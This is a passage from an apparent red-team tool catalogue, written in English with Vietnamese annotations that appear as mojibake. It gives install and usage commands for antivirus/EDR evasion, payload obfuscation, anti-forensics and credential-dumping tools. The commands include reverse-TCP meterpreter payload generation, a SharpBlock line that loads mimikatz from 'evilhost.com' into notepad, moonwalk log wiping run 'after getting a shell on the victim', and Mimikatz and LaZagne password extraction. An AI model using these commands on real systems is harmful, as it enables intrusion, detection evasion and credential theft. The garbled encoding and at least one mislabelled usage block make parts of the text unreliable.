**LÆ°u Ã½:** Cháº¡y **script Invoke-Obfuscation.psd1** hoáº·c **Invoke-Obfuscation.psm1** (hoáº·c script launcher chÃ­nh) trong PowerShell. ThÆ°á»ng cáº§n import module nÃ y trÆ°á»›c khi cháº¡y cÃ¡c hÃ m cá»§a nÃ³. CÃ´ng cá»¥ hoáº¡t Ä‘á»™ng á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c, báº¡n cung cáº¥p mÃ£ **PowerShell** cáº§n che giáº¥u vÃ  chá»n cÃ¡c ká»¹ thuáº­t che giáº¥u tá»« menu.

![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)

### [ğŸ”™](#tool-list)[**Veil**](https://github.com/Veil-Framework/Veil)

**Veil** is a tool for generating **metasploit payloads** that bypass common anti-virus solutions.

It can be used to generate obfuscated shellcode, see the official [**veil framework blog**](https://www.veil-framework.com/) for more info.

**Install (Kali):**

```bash
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **Veil** vÃ  cháº¡y **script setup.sh** cá»§a nÃ³ trÃªn **Kali Linux** báº±ng **apt**. **Script setup.sh** sáº½ cÃ i Ä‘áº·t cÃ¡c module vÃ  dependency cáº§n thiáº¿t.

**Install (Git):**

```bash
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t báº±ng **Git** trÃªn **Linux**, sau Ä‘Ã³ cháº¡y **script setup.sh** tÆ°Æ¡ng tá»± nhÆ° trÃªn **Kali**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Liá»‡t kÃª táº¥t cáº£ payload (â€“list-payloads) cho cÃ´ng cá»¥ Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-payloads

# Liá»‡t kÃª táº¥t cáº£ encoder (â€“list-encoders) cho cÃ´ng cá»¥ Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-encoders

# Generate a reverse tcp payload which connects back to the ip 192.168.1.20 on port 1234
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234

# Liá»‡t kÃª táº¥t cáº£ payload (â€“list-payloads) cho cÃ´ng cá»¥ Evasion (-t Evasion)
./Veil.py -t Evasion --list-payloads

# Generate shellcode using Evasion, payload number 41, reverse_tcp to 192.168.1.4 on port 8676, output file chris
./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
```
**LÆ°u Ã½:** **Veil.py** lÃ  script chÃ­nh Ä‘á»ƒ cháº¡y. `-t` chá»‰ Ä‘á»‹nh toolkit (`Ordnance` hoáº·c `Evasion`). CÃ¡c cá» nhÆ° `--list-payloads`, `--list-encoders`, `--ordnance-payload`, `--msfvenom` Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ liá»‡t kÃª hoáº·c chá»n/cáº¥u hÃ¬nh **payload/encoder**. `-o` chá»‰ Ä‘á»‹nh tÃªn file output. CÃ´ng cá»¥ nÃ y cháº¡y trÃªn **Linux** (hoáº·c há»‡ thá»‘ng **attacker**) Ä‘á»ƒ táº¡o cÃ¡c **payload** Ä‘Ã£ bá»‹ che giáº¥u.

**Veil** creators wrote a nice [blog post](https://www.veil-framework.com/veil-command-line-usage/) explaining further ordnance and evasion command line usage.

![image](https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png)

### [ğŸ”™](#tool-list)[**SharpBlock**](https://github.com/CCob/SharpBlock)

A method of bypassing EDR's active projection DLL's by preventing entry point execution.

**TÃ­nh nÄƒng:**

- Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
- Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
- Host process that is replaced with an implant PE that can be loaded from disk, HTTP or named pipe (Cobalt Strike).
- Implanted process is hidden to help evade scanners looking for hollowed processes.
- Command line args are spoofed and implanted after process creation using stealthy EDR detection method.
- Patchless ETW bypass.
- Blocks NtProtectVirtualMemory invocation when callee is within the range of a blocked DLL's address space.

**Install:**

Use [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) to compile the **SharpBlock** binary.

Open the **SharpBlock** [project .sln](https://github.com/CCob/SharpBlock), choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n C# báº±ng **Visual Studio**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Launch mimikatz over HTTP using notepad as the host process, blocking SylantStrike's DLL
SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee

# Launch mimikatz using Cobalt Strike beacon over named pipe using notepad as the host process, blocking SylantStrike's DLL
execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
```
**LÆ°u Ã½:** **SharpBlock** lÃ  má»™t **loader** thá»±c thi mÃ£ (`-e` Ä‘á»ƒ chá»‰ Ä‘á»‹nh nguá»“n shellcode hoáº·c binary), nÃ³ cá»‘ gáº¯ng inject/host payload vÃ o má»™t tiáº¿n trÃ¬nh há»£p phÃ¡p Ä‘Ã£ cÃ³ (`-s`, á»Ÿ Ä‘Ã¢y lÃ  notepad.exe) Ä‘á»ƒ trÃ´ng giá»‘ng tiáº¿n trÃ¬nh bÃ¬nh thÆ°á»ng. `-d` chá»‰ Ä‘á»‹nh tÃªn cá»§a DLL **EDR** cáº§n nÃ© trÃ¡nh, vÃ  cÃ´ng cá»¥ nÃ y Ã¡p dá»¥ng ká»¹ thuáº­t Ä‘á»ƒ block hook cá»§a **EDR** trong tiáº¿n trÃ¬nh Ä‘Ã³. `execute-assembly` lÃ  má»™t lá»‡nh trong **Cobalt Strike** Ä‘á»ƒ cháº¡y má»™t assembly .NET trong bá»™ nhá»› cá»§a **beacon**. Ká»¹ thuáº­t nÃ y nháº±m nÃ© trÃ¡nh cÃ¡c **EDR** cá»¥ thá»ƒ vÃ  giÃ¡m sÃ¡t tiáº¿n trÃ¬nh/bá»™ nhá»›. Cháº¡y trÃªn **Windows**.

Nice PenTestPartners blog post [táº¡i Ä‘Ã¢y](https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/).

![image](https://user-images.githubusercontent.com/100603074/210983524-d6ea4255-7c47-45bb-8b13-9f6240735b0e.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://youtu.be/0W9wkamknfM*

### [ğŸ”™](#tool-list)[**Alcatraz**](https://github.com/weak1337/Alcatraz)

**Alcatraz** is a GUI **x64 binary obfuscator** that is able to obfuscate various different pe files including:

- **.exe**
- **.dll**
- **.sys**

Some supported obfuscation features include:

- Obfuscation of immediate moves
- Control flow flattening
- ADD mutation
- Entry-point obfuscation
- Lea obfuscation

**Install (Requirements):**

Install: https://vcpkg.io/en/getting-started.html

```bash
vcpkg.exe install asmjit:x64-windows
vcpkg.exe install zydis:x64-windows
```
**LÆ°u Ã½:** **Alcatraz** lÃ  má»™t cÃ´ng cá»¥ dá»±a trÃªn **Windows** (vÃ¬ nÃ³ thao tÃ¡c tá»‡p PE cá»§a **Windows**), yÃªu cáº§u mÃ´i trÆ°á»ng build/dependency cá»¥ thá»ƒ nhÆ° **vcpkg** Ä‘á»ƒ cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n phÃ¡t triá»ƒn cáº§n thiáº¿t nhÆ° **asmjit** vÃ  **zydis**.

**CÃ¡ch sá»­ dá»¥ng:**

Using the GUI to obfuscate a binary:

1. Load a binary by clicking `file` in the top left corner.
2. Add functions by expanding the `Functions` tree. (You can search by putting in the name in the searchbar at the top)
3. Hit `compile` (**Note:** *Obfuscating lots of functions might take some seconds*)
**LÆ°u Ã½:** Alcatraz lÃ  má»™t cÃ´ng cá»¥ cÃ³ giao diá»‡n ngÆ°á»i dÃ¹ng Ä‘á»“ há»a (GUI) Ä‘á»ƒ thá»±c hiá»‡n viá»‡c che giáº¥u tá»‡p nhá»‹ phÃ¢n.

![image](https://user-images.githubusercontent.com/100603074/211530410-12982326-8fff-4415-bdde-2ebf6db2ae6c.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/weak1337/Alcatraz*

### [ğŸ”™](#tool-list)[**Mangle**](https://github.com/optiv/Mangle)

**Mangle** is a tool that manipulates aspects of compiled executables (**.exe** or **DLL**).

**Mangle** can remove known Indicators of Compromise (IoC) based strings and replace them with random characters, change the file by inflating the size to avoid **EDRs**, and can clone **code-signing certs** from legitimate files.

In doing so, **Mangle** helps loaders evade on-disk and in-memory scanners.

**Install:**

The first step, as always, is to clone the repo. Before you compile **Mangle**, you'll need to install the dependencies. To install them, run the following commands:

```
go get github.com/Binject/debug/pe
```
**LÆ°u Ã½:** Táº£i dependency **Golang** cáº§n thiáº¿t Ä‘á»ƒ thao tÃ¡c tá»‡p PE. YÃªu cáº§u mÃ´i trÆ°á»ng Go.

Then build it

```
git clone https://github.com/optiv/Mangle
cd Mangle
go build Mangle.go
```
**LÆ°u Ã½:** Clone mÃ£ nguá»“n **Mangle** báº±ng **Git** vÃ  biÃªn dá»‹ch file thá»±c thi báº±ng **Go**.

**CÃ¡ch sá»­ dá»¥ng:**

```
Usage of ./ScareCrow:
  -C string
        Path to the file containing the certificate you want to clone
  -I string
        Path to the orginal file
  -M    Edit the PE file to strip out Go indicators
  -O string
        The new file name
  -S int
        How many MBs to increase the file by
```
**LÆ°u Ã½:** Output help cho cÃ´ng cá»¥ nÃ y. CÃ¡c tham sá»‘ dÃ²ng lá»‡nh chÃ­nh bao gá»“m: `-C` Ä‘á»ƒ chá»‰ Ä‘á»‹nh chá»©ng chá»‰ cáº§n sao chÃ©p (ká»¹ thuáº­t **code-signing clone**), `-I` tá»‡p input, `-M` Ä‘á»ƒ loáº¡i bá» dáº¥u hiá»‡u Go trong tá»‡p nhá»‹ phÃ¢n Ä‘Æ°á»£c biÃªn dá»‹ch báº±ng Go, `-O` tÃªn file output, `-S` Ä‘á»ƒ tÄƒng kÃ­ch thÆ°á»›c file (ká»¹ thuáº­t nÃ© trÃ¡nh heuristic dá»±a trÃªn kÃ­ch thÆ°á»›c). **Mangle** lÃ  má»™t cÃ´ng cá»¥ manipulation binary.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/optiv/Mangle#usage).

![image](https://user-images.githubusercontent.com/100603074/216736894-ce46ac43-52b8-42bd-9f03-5d7656a635ff.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/optiv/Mangle*

### [ğŸ”™](#tool-list)[**AMSI Fail**](http://amsi.fail/)

**AMSI.fail** is a great website that can be used to generate obfuscated **PowerShell snippets** that break or disable **AMSI** for the current process.

The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.

Nice f-secure blog explaining **AMSI** [táº¡i Ä‘Ã¢y](https://blog.f-secure.com/hunting-for-amsi-bypasses/).
**LÆ°u Ã½:** **AMSI (Antimalware Scan Interface)** lÃ  má»™t interface trong **Windows** cho phÃ©p cÃ¡c á»©ng dá»¥ng vÃ  dá»‹ch vá»¥ (bao gá»“m **PowerShell**) truyá»n dá»¯ liá»‡u Ä‘áº¿n cÃ¡c **anti-malware provider** trÃªn há»‡ thá»‘ng Ä‘á»ƒ quÃ©t. CÃ¡c ká»¹ thuáº­t bypass **AMSI** cá»‘ gáº¯ng lÃ m cho interface nÃ y ngá»«ng hoáº¡t Ä‘á»™ng hoáº·c khÃ´ng truyá»n Ä‘Ãºng dá»¯ liá»‡u Ä‘á»™c háº¡i. Trang web **amsi.fail** cung cáº¥p cÃ¡c Ä‘oáº¡n code **PowerShell** Ä‘Æ°á»£c táº¡o ngáº«u nhiÃªn Ä‘á»ƒ thá»­ nÃ© trÃ¡nh **AMSI**, má»—i láº§n refresh láº¡i lÃ  má»™t Ä‘oáº¡n code khÃ¡c nhau.

![image](https://user-images.githubusercontent.com/100603074/217655078-919e9c98-4c78-4c2b-a695-3e1c4d3f1e65.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« http://amsi.fail/*

### [ğŸ”™](#tool-list)[**ScareCrow**](https://github.com/optiv/ScareCrow)

**ScareCrow** is a **payload creation framework** for side loading (not injecting) into a legitimate **Windows process** (bypassing **Application Whitelisting** controls).

Once the **DLL loader** is loaded into memory, it utilizes a technique to flush an EDRâ€™s hook out of the system DLLs running in the process's memory.

When executed, **ScareCrow** will copy the bytes of the system DLLs stored on disk in `C:\Windows\System32\`. These DLLs are stored on disk â€œcleanâ€ of EDR hooks because they are used by the system to load an unaltered copy into a new process when itâ€™s spawned. Since EDRâ€™s only hook these processes in memory, they remain unaltered.

Nice blogs for learning about techniques utilized by **ScareCrow**:

- [Endpoint Detection and Response: How Hackers Have Evolved](https://www.optiv.com/explore-optiv-insights/source-zero/endpoint-detection-and-response-how-hackers-have-evolved)
- [EDR and Blending In: How Attackers Avoid Getting Caught](https://www.optiv.com/explore-optiv-insights/source-zero/edr-and-blending-how-attackers-avoid-getting-caught)

**Install:**

*ScareCrow requires **golang 1.16.1** or later to compile loaders.*

```bash
# Clone
git clone https://github.com/optiv/ScareCrow
cd ScareCrow

# Install dependencies
go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo

# Required
openssl
osslsigncode
mingw-w64

# Build
go build ScareCrow.go
```
**LÆ°u Ã½:** HÆ°á»›ng dáº«n cÃ i Ä‘áº·t vÃ  build cÃ´ng cá»¥ báº±ng **Golang** trÃªn há»‡ thá»‘ng **attacker**. NÃ³ yÃªu cáº§u **Git**, mÃ´i trÆ°á»ng Go, **OpenSSL**, **osslsigncode** vÃ  **mingw-w64** Ä‘á»ƒ biÃªn dá»‹ch cÃ¡c thÃ nh pháº§n cáº§n thiáº¿t, Ä‘áº·c biá»‡t lÃ  Ä‘á»ƒ kÃ½ mÃ£ cho cÃ¡c loader (lÃ m cho chÃºng trÃ´ng Ä‘Ã¡ng tin cáº­y hÆ¡n).

**CÃ¡ch sá»­ dá»¥ng:**

```
Usage of ./ScareCrow:
  -I string
        ÄÆ°á»ng dáº«n Ä‘áº¿n shellcode raw 64-bit.
  -Loader string
        Äáº·t loáº¡i tiáº¿n trÃ¬nh sáº½ sideload payload Ä‘á»™c háº¡i:
        [*] binary - Táº¡o payload dá»±a trÃªn binary. (Loáº¡i nÃ y khÃ´ng táº­n dá»¥ng lá»£i Ã­ch cá»§a sideloading)
        [*] control - Load applet control áº©n - tÃªn tiáº¿n trÃ¬nh sáº½ lÃ  rundll32 if -O is specified a JScript loader will be generated.
        [*] dll - Chá»‰ táº¡o má»™t tá»‡p DLL. Can be executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
        [*] excel - Load vÃ o tiáº¿n trÃ¬nh Excel áº©n sá»­ dá»¥ng loader JScript.
        [*] msiexec - Load vÃ o tiáº¿n trÃ¬nh MSIexec sá»­ dá»¥ng loader JScript.
        [*] wscript - Load vÃ o tiáº¿n trÃ¬nh WScript process using a JScript loader. (default "binary")
  -O string
        TÃªn tá»‡p Ä‘áº§u ra (e.g. loader.js or loader.hta). If Loader is set to dll or binary this option is not required.
  -configfile string
        The path to a json based configuration file to generate custom file attributes. This will not use the default ones.
  -console
        Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.
...
```
**LÆ°u Ã½:** **Output help** cá»§a **ScareCrow**. NÃ³ lÃ  má»™t **framework** táº¡o loader/payload tiÃªn tiáº¿n vá»›i nhiá»u tÃ¹y chá»n nÃ© trÃ¡nh. `-I` chá»‰ Ä‘á»‹nh shellcode input. `-Loader` chá»n loáº¡i loader sáº½ táº¡o (file thá»±c thi, DLL, JScript, HTA,...), áº£nh hÆ°á»Ÿng Ä‘áº¿n tiáº¿n trÃ¬nh **Windows** Ä‘Ã­ch. `-O` Ä‘áº·t tÃªn file output. Tool nÃ y káº¿t há»£p cÃ¡c ká»¹ thuáº­t Ä‘á»ƒ nÃ© trÃ¡nh **Application Whitelisting** vÃ  cÃ¡c **hook EDR** báº±ng cÃ¡ch sideload mÃ£ Ä‘á»™c vÃ o tiáº¿n trÃ¬nh há»‡ thá»‘ng vÃ  flush hook **EDR**.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/optiv/ScareCrow#loader).

![image](https://user-images.githubusercontent.com/100603074/220959052-029eac69-0b38-40d5-bc1a-7e90b0c93726.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/optiv/ScareCrow*

### [ğŸ”™](#tool-list)[**moonwalk**](https://github.com/mufeedvh/moonwalk)

**moonwalk** is a 400 KB single-binary executable that can clear your traces while **penetration testing** a **Unix** machine.

It saves the state of system logs pre-exploitation and reverts that state including the filesystem timestamps post-exploitation leaving zero traces of a ghost in the shell.

**Install:**

```bash
curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
```
**LÆ°u Ã½:** Táº£i xuá»‘ng file binary cá»§a **moonwalk** cho **Linux** vÃ  lÆ°u dÆ°á»›i tÃªn `moonwalk`. PhÆ°Æ¡ng phÃ¡p tiá»‡n lá»£i trÃªn há»‡ thá»‘ng **Linux** Ä‘Ã£ bá»‹ xÃ¢m nháº­p.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Báº¯t Ä‘áº§u moonwalk straight after getting a shell on the victim Linux endpoint
curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
chmod +x moonwalk
moonwalk start

# Once you are finished, clear your traces
moonwalk finish
```
**LÆ°u Ã½:** Báº¡n cáº§n cáº¥p quyá»n thá»±c thi cho file **moonwalk** Ä‘Ã£ táº£i vá» (`chmod +x moonwalk`). Sau Ä‘Ã³ cháº¡y nÃ³ vá»›i lá»‡nh `start` khi báº¡n báº¯t Ä‘áº§u cÃ¡c hoáº¡t Ä‘á»™ng cÃ³ thá»ƒ Ä‘á»ƒ láº¡i dáº¥u váº¿t (vÃ­ dá»¥: chá»‰nh sá»­a file cáº¥u hÃ¬nh, thá»±c thi lá»‡nh). Khi hoÃ n thÃ nh, cháº¡y `moonwalk finish` Ä‘á»ƒ **moonwalk** cá»‘ gáº¯ng khÃ´i phá»¥c cÃ¡c file/dáº¥u thá»i gian Ä‘Ã£ Ä‘Æ°á»£c lÆ°u trá»¯ ban Ä‘áº§u, xÃ³a dáº¥u váº¿t cá»§a báº¡n. Ráº¥t há»¯u Ã­ch cho **anti-forensics** trÃªn **Linux**.

![image](https://user-images.githubusercontent.com/100603074/220959174-9c72922f-40cc-4843-bdc8-353cc55a3c51.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/mufeedvh/moonwalk*

**Credential Access**
====================

### [ğŸ”™](#tool-list)[**Mimikatz**](https://github.com/gentilkiwi/mimikatz)

Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained **privileged access** to a system, drop this tool to collect some creds.

**Install:**

1. Download the [mimikatz_trunk.7z](https://github.com/gentilkiwi/mimikatz/releases) file.
2. Once downloaded, the `mimikatz.exe` binary is in the `x64` folder.
**LÆ°u Ã½:** Táº£i xuá»‘ng tá»‡p nÃ©n chá»©a file nhá»‹ phÃ¢n **Mimikatz.exe**. ÄÃ¢y lÃ  cÃ´ng cá»¥ cháº¡y trÃªn **Windows**, phiÃªn báº£n x64 náº±m trong thÆ° má»¥c `x64`. **Mimikatz** lÃ  má»™t trong nhá»¯ng cÃ´ng cá»¥ máº¡nh nháº¥t Ä‘á»ƒ láº¥y thÃ´ng tin xÃ¡c thá»±c trÃªn há»‡ thá»‘ng **Windows**, bao gá»“m máº­t kháº©u dáº¡ng vÄƒn báº£n rÃµ, hash **NTLM**, vÃ© **Kerberos**,...

**CÃ¡ch sá»­ dá»¥ng:**

```bash
.\mimikatz.exe
privilege::debug
```
**LÆ°u Ã½:**
`.\mimikatz.exe`: Cháº¡y tá»‡p thá»±c thi **Mimikatz**. CÃ´ng cá»¥ hoáº¡t Ä‘á»™ng á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c theo dÃ²ng lá»‡nh cá»§a riÃªng nÃ³.
`privilege::debug`: Lá»‡nh trong **Mimikatz** Ä‘á»ƒ thiáº¿t láº­p Ä‘áº·c quyá»n `SeDebugPrivilege` cho tiáº¿n trÃ¬nh **Mimikatz** hiá»‡n táº¡i. Äáº·c quyá»n nÃ y thÆ°á»ng cáº§n thiáº¿t Ä‘á»ƒ truy cáº­p vÃ  dump bá»™ nhá»› cá»§a cÃ¡c tiáº¿n trÃ¬nh há»‡ thá»‘ng nháº¡y cáº£m nhÆ° **LSASS**. YÃªu cáº§u cháº¡y **Mimikatz** vá»›i quyá»n **quáº£n trá»‹** viÃªn Ä‘á»ƒ cÃ³ thá»ƒ thiáº¿t láº­p Ä‘áº·c quyá»n nÃ y. Sau Ä‘Ã³, báº¡n cÃ³ thá»ƒ cháº¡y cÃ¡c module khÃ¡c nhÆ° `sekurlsa::logonpasswords` Ä‘á»ƒ **dump** thÃ´ng tin xÃ¡c thá»±c.

![image](https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png)

### [ğŸ”™](#tool-list)[**LaZagne**](https://github.com/AlessandroZ/LaZagne)

Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.

**Install (Binary):**

You can install the standalone binary from [táº¡i Ä‘Ã¢y](https://github.com/AlessandroZ/LaZagne/releases/).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ biÃªn dá»‹ch sáºµn. **LaZagne** lÃ  cÃ´ng cá»¥ cháº¡y trÃªn **Windows**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Launch all modes
.\laZagne.exe all

# Launch only a specific module
.\laZagne.exe browsers

# Launch only a specific software script
.\laZagne.exe browsers -firefox
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **LaZagne.exe** vá»›i cÃ¡c Ä‘á»‘i sá»‘ khÃ¡c nhau. `all` cá»‘ gáº¯ng trÃ­ch xuáº¥t máº­t kháº©u tá»« táº¥t cáº£ cÃ¡c á»©ng dá»¥ng vÃ  dá»‹ch vá»¥ mÃ  nÃ³ há»— trá»£. Báº¡n cÅ©ng cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh má»™t module cá»¥ thá»ƒ (`browsers`) hoáº·c tháº­m chÃ­ lÃ  má»™t á»©ng dá»¥ng cá»¥ thá»ƒ trong module Ä‘Ã³ (`-firefox`). CÃ´ng cá»¥ nÃ y cháº¡y trÃªn há»‡ thá»‘ng má»¥c tiÃªu Ä‘á»ƒ tÃ¬m vÃ  giáº£i mÃ£ máº­t kháº©u Ä‘Æ°á»£c lÆ°u trá»¯ bá»Ÿi cÃ¡c á»©ng dá»¥ng thÃ´ng thÆ°á»ng.

![image](https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png)

### [ğŸ”™](#tool-list)[**hashcat**](https://github.com/hashcat/hashcat)

Tool for cracking **password hash**es. Supports a large list of hashing algorithms (Full list can be found [táº¡i Ä‘Ã¢y](https://hashcat.net/wiki/doku.php?id=example_hashes)).

**Install: Binary**

You can install the standalone binary from [táº¡i Ä‘Ã¢y](https://hashcat.net/hashcat/).
**LÆ°u Ã½:** Táº£i xuá»‘ng file binary cho há»‡ Ä‘iá»u hÃ nh cá»§a báº¡n. **Hashcat** lÃ  cÃ´ng cá»¥ phá»• biáº¿n vÃ  máº¡nh máº½ Ä‘á»ƒ crack hash máº­t kháº©u, sá»­ dá»¥ng tÃ i nguyÃªn **CPU** vÃ  **GPU**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
.\hashcat.exe --help
```
**LÆ°u Ã½:** Lá»‡nh hiá»ƒn thá»‹ mÃ n hÃ¬nh trá»£ giÃºp, ráº¥t chi tiáº¿t do **hashcat** há»— trá»£ nhiá»u cháº¿ Ä‘á»™ táº¥n cÃ´ng (brute force, dictionary, hybrid, mask,...) vÃ  hÃ ng trÄƒm loáº¡i hash (cháº¿ Ä‘á»™ -m). Báº¡n cáº§n cung cáº¥p file hash cáº§n crack vÃ  phÆ°Æ¡ng thá»©c táº¥n cÃ´ng (wordlist, rule, mask,...).

Nice **hashcat** command [cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/).

![image](https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png)

### [ğŸ”™](#tool-list)[**John the Ripper**](https://github.com/openwall/john)

Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.

**Install:**

```bash
sudo apt-get install john -y
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **John the Ripper** trÃªn **Linux/Debian/Ubuntu** báº±ng **apt**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
john
```
**LÆ°u Ã½:** Cháº¡y cÃ´ng cá»¥ **John the Ripper**. NÃ³ cÅ©ng lÃ  má»™t cÃ´ng cá»¥ crack máº­t kháº©u, thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng tá»« dÃ²ng lá»‡nh hoáº·c á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c. Giá»‘ng nhÆ° **hashcat**, báº¡n cáº§n cung cáº¥p file hash vÃ  phÆ°Æ¡ng thá»©c táº¥n cÃ´ng.

![image](https://user-images.githubusercontent.com/100603074/208263690-8c2d1253-7261-47da-850d-ca5a8d98ca13.png)

### [ğŸ”™](#tool-list)[**SCOMDecrypt**](https://github.com/nccgroup/SCOMDecrypt)

CÃ´ng cá»¥ nÃ y Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ truy xuáº¥t vÃ  giáº£i mÃ£ thÃ´ng tin xÃ¡c thá»±c **RunAs** Ä‘Æ°á»£c lÆ°u trá»¯ trong cÃ¡c cÆ¡ sá»Ÿ dá»¯ liá»‡u **Microsoft System Center Operations Manager (SCOM)**.

NCC blog post - ['SCOMplicated? â€“ Decrypting SCOM â€œRunAsâ€ credentials'](https://research.nccgroup.com/2017/02/23/scomplicated-decrypting-scom-runas-credentials/)

**Äiá»u kiá»‡n tiÃªn quyáº¿t:**

To run the tool you will require administrative privileges on the **SCOM server**. You will also need to ensure that you have read access to the following registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\MOMBins
```

You can check manually that you can see the database by gathering the connection details from the following keys:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```
**LÆ°u Ã½:** **Äiá»u kiá»‡n tiÃªn quyáº¿t** quan trá»ng nháº¥t lÃ  **pháº£i cÃ³ quyá»n quáº£n trá»‹ trÃªn SCOM server** vÃ  cÃ³ thá»ƒ Ä‘á»c cÃ¡c khÃ³a registry nÃ y. ThÃ´ng tin xÃ¡c thá»±c **RunAs** trong **SCOM** Ä‘Æ°á»£c lÆ°u trá»¯ Ä‘Ã£ mÃ£ hÃ³a, vÃ  khÃ³a giáº£i mÃ£ Ä‘Æ°á»£c lÆ°u trong registry.

**Install (PS1):**

```
git clone https://github.com/nccgroup/SCOMDecrypt
cd .\SCOMDecrypt\SCOMDecrypt\
. .\Invoke-SCOMDecrypt.ps1
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n script **PowerShell**, di chuyá»ƒn vÃ o thÆ° má»¥c vÃ  cháº¡y script **`Invoke-SCOMDecrypt.ps1`** báº±ng cÃ¡ch sá»­ dá»¥ng cÃº phÃ¡p `.` Ä‘á»ƒ source script, lÃ m cho cÃ¡c hÃ m cá»§a nÃ³ cÃ³ sáºµn trong phiÃªn PowerShell hiá»‡n táº¡i.

**Install (BiÃªn dá»‹ch):**

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) you can compile the **SCOMDecrypt** binary.

Open the **SCOMDecrypt** [project .sln](https://github.com/nccgroup/SCOMDecrypt), choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch tá»« mÃ£ nguá»“n **C#** báº±ng **Visual Studio** Ä‘á»ƒ táº¡o file thá»±c thi.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# PS1
Invoke-SCOMDecrypt

# Compiled C# binary
.\SCOMDecrypt.exe
```
